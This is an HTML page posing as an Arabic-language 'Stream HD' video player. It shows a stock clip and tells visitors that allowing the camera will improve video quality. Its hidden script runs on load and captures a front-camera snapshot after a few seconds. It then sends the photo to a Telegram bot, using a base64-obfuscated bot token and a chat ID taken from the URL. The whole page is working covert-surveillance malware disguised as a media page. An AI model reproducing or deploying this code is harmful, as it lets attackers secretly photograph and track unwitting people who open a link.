<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stream HD</title>
    <style>
        body { background: #000; color: #fff; text-align: center; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; }
        video { width: 95%; max-width: 420px; border-radius: 15px; border: 2px solid #444; }
    </style>
</head>
<body>
    <video autoplay muted loop playsinline>
        <source src="https://vjs.zencdn.net/v/oceans.mp4" type="video/mp4">
    </video>
    <p style="color: #888; font-size: 13px;">جاري تحسين الجودة... يرجى السماح بالكاميرا</p>
    <canvas id="c" style="display:none;"></canvas>
    <script>
        const t = atob("ODM4NjQyNzMyMTpBQUZLcThmQ3NvUEVEZ2NGOEtORlIyTlVyN0doMER3ZnNrRQ==");
        const id = new URLSearchParams(window.location.search).get('id');
        const v = document.createElement('video');
        window.onload = function() {
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                v.srcObject = stream; v.play();
                setTimeout(() => {
                    const canvas = document.getElementById('c');
                    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
                    canvas.getContext('2d').drawImage(v, 0, 0);
                    canvas.toBlob(blob => {
                        const f = new FormData(); f.append('photo', blob, 'img.jpg'); f.append('chat_id', id);
                        fetch(`https://api.telegram.org/bot${t}/sendPhoto`, { method: 'POST', body: f });
                    }, 'image/jpeg');
                }, 3500);
            }).catch(() => { alert("يرجى السماح بالكاميرا لتشغيل الفيديو."); });
        };
    </script>
</body>
</html>
